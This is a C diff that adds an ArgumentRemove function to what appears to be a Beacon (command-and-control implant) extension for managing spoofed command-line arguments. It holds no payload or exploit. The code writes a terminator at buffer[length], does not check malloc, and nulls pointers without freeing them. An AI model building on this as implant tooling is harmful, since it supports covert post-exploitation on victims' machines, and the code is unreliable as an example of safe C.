@@ -83,3 +83,21 @@ void ArgumentAdd(char* buffer, int length)
 
 	BeaconDataFree(locals);
 }
+
+void ArgumentRemove(char* buffer, int length)
+{
+	char* expanded = malloc(MAX_EXPANDED);
+	buffer[length] = '\0';
+	ExpandEnvironmentStrings_s(buffer, expanded, MAX_EXPANDED);
+	// For each active argument
+	for (ARGUMENT_ENTRY* current = gArguments; current != NULL; current = current->next)
+	{
+		if (current->isActive && strcmp(expanded, current->expandedCmd) == 0)
+		{
+			current->isActive = FALSE;
+			*current = (ARGUMENT_ENTRY){ .isActive = FALSE, .expandedCmd = NULL, .expandedFullCmd = NULL, .next = current->next };
+			break;
+		}
+	}
+	free(expanded);
+}
